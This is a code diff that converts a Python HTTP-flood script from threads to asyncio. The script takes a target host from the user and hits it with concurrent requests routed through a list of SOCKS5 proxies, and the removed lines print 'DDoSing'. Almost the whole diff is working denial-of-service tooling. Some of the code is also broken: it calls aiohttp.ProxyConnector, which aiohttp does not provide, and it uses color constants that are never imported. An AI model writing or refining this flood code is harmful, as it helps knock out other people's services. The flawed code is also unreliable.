@@ -1,7 +1,7 @@
 import socket
 import socks
-import threading
-import requests
+import asyncio
+import aiohttp
 import time
 import os
 
@@ -18,34 +18,37 @@ url = input("Host : ")
 with open('socks5.txt', 'r') as f:
     sock_list = f.read().splitlines()
 
-def response_http_socks(socks_address, socks_port):
-    session = requests.Session()
+async def response_http_socks(socks_address, socks_port):
+    session = aiohttp.ClientSession()
 
-    socks.set_default_proxy(socks.SOCKS5, socks_address, int(socks_port))
-    socket.socket = socks.socksocket
+    socks_conn = aiohttp.ProxyConnector.from_url(f'socks5://{socks_address}:{socks_port}')
+    async with aiohttp.ClientSession(connector=socks_conn) as session:
+        try:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    print(Fore.GREEN + Style.BRIGHT + "Request Successful")
+                else:
+                    print(Fore.RED + Style.BRIGHT + "Request Failed")
+        except Exception as e:
+            print(Fore.RED + Style.BRIGHT + "Error: ", e)
 
-    response = requests.get(url)
-    if response.status_code == 200:
-        print(Fore.BLUE + Style.BRIGHT + " DDoSing.........")
-    else:
-        print(Fore.YELLOW + Style.BRIGHT + "Server May Be DOWN....")
+        print(Fore.YELLOW + Style.BRIGHT + "socks_address: ", socks_address)
+        print(Fore.YELLOW + Style.BRIGHT + "socks_port: ", socks_port)
 
-threads = []
+tasks = []
 
 for socks_address in sock_list:
     socks_address, socks_port = socks_address.split(':')
 
-    t = threading.Thread(target=response_http_socks, args=(socks_address,socks_port))
+    task = asyncio.ensure_future(response_http_socks(socks_address, socks_port))
 
-    threads.append(t)
+    tasks.append(task)
 
 start_time = time.time()
-for t in threads:
-    t.start()
 
-for t in threads:
-    t.join()
+loop = asyncio.get_event_loop()
+loop.run_until_complete(asyncio.gather(*tasks))
 
 end_time = time.time()
 elapsed_time = end_time - start_time
-print(f"elapsed_time for 1000 requests")
+print(f"elapsed_time: {elapsed_time}")
